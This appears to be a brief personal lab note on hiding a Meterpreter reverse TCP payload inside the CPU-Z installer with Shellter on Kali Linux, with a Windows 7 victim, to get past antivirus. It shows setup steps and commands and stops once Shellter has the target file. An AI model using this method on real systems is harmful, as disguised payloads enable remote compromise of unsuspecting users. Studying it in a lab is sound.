#topic Metasploit and Shellter

Using Kali Linux for attacking and Windows 7 as a Victim

---
## 2025-08-17
**Set-up:**  
- Install shellter and wine 32 on Kali Linux.
- Install cupz on Kali Linux so we can add a meterpreter reverse tcp payload in it.

**Managing the downloaded file :** 
```
cd Desktop
mkdir av-bypass
cp /home/kali/Downloads/cpu-z_1.96-en.exe av-bypass
cd av-bypass
ls
mv cpu-z_1.96-en.exe cpuz.exe
ls
```

**Adding the payload:**
```
sudo shellter
A (automatic)
PE target: /home/kali/Desktop/av-bypass/cpuz.exe

```
